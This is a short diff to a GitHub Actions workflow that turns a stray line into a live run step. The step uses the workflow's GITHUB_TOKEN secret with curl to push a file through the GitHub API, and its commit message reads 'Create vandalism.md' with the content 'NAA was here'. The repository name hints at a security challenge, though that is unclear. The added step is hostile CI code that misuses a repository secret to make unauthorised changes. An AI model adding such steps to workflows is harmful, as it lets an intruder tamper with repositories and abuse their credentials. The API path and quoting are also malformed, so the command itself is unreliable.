@@ -9,4 +9,4 @@ jobs:
         uses: actions/checkout@v2
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}' '
+      - run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}' '
